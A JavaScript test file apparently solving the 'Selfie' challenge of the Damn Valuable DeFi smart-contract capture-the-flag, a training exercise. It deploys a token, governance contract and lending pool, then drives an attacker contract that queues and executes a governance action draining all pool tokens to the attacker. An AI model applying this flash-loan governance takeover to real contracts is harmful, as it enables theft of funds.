const { ether, time } = require("@openzeppelin/test-helpers");
const { accounts, contract } = require("@openzeppelin/test-environment");

const DamnValuableTokenSnapshot = contract.fromArtifact(
  "DamnValuableTokenSnapshot"
);
const SelfiePool = contract.fromArtifact("SelfiePool");
const SimpleGovernance = contract.fromArtifact("SimpleGovernance");
const SelfieAttacker = contract.fromArtifact("SelfieAttacker");

const { expect } = require("chai");

describe("[Challenge] Selfie", function () {
  const [deployer, attacker, ...otherAccounts] = accounts;

  const TOKEN_INITIAL_SUPPLY = ether("2000000");
  const TOKENS_IN_POOL = ether("1500000");

  before(async function () {
    /** SETUP SCENARIO */
    this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, {
      from: deployer,
    });
    this.governance = await SimpleGovernance.new(this.token.address, {
      from: deployer,
    });
    this.pool = await SelfiePool.new(
      this.token.address,
      this.governance.address,
      { from: deployer }
    );

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
      from: deployer,
    });

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      TOKENS_IN_POOL
    );
  });

  it("Exploit", async function () {
    this.attacker = await SelfieAttacker.new(
      this.token.address,
      this.governance.address,
      this.pool.address,
      { from: attacker }
    );
    // queues action to drain all funds to attack
    await this.attacker.attack({ from: attacker });
    // Advance time 2 days to simulate governance action delay
    await time.increase(time.duration.days(2));
    await this.governance.executeAction(await this.attacker.actionId(), { from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      "0"
    );
  });
});
